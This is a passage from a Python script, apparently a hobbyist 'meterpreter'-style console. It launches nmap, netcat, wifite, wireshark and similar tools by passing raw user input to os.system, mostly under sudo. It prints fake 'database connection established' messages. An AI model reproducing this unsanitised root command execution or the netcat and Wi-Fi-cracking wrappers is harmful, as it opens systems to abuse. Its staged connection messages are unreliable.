                else:
                    os.system('sudo '+ n)
        elif a == "db-nmap":
            print("\033[37mConnecting to Nmap database...")
            time.sleep(1)
            print("\033[31mConnection Established!!!\033[37m")
            time.sleep(0.2)
            print("""\033[37m
Usage: \033[31mnmap\033[37m [Scan Type(s)] [Options] {target specification}
TARGET SPECIFICATION:
Can pass hostnames, IP addresses, networks, etc.
For more help type 'nmap -h', to exit type 'exit'
                 """)
            nmap = True
            while nmap:
                n = input("\033[37m Nmap \033[31m>\033[37m ")
                if n =="exit":
                    print("\033[31mExitting Network-Mapper\033[37m")
                    nmap = False
                else:
                    os.system('sudo ' + n)
        elif a == "db-netcat":
            print("\033[37mConnecting to Netcat database...")
            time.sleep(1)
            print("\033[31mConnection Established!!!\033[37m")
            time.sleep(0.2)
            os.system("nc -help")
            nc = True
            while nc:
                netcat = input("\033[37m Netcat \033[31m>\033[37m ")
                if netcat == "exit":
                    print("\033[31mExitting Netcat\033[37m")
                    nc = False
                elif netcat == "help":
                    os.system("nc -help")
                else:
                    os.system(netcat)
        elif a =="etherape":
            os.system("sudo etherape")
        elif a =="ifconfig":
            os.system("sudo ifconfig")
        elif a =="wifi":
            os.system("sudo wifite")
        elif a =="wireshark":
            os.system("sudo wireshark")
        else:
            print(a, " not recognized as an internal or external command")
            print("Use 'help' to see the command list")
    metcon=False
meterpreter()

#----------------------------------------------------------------------------------------------------------------------
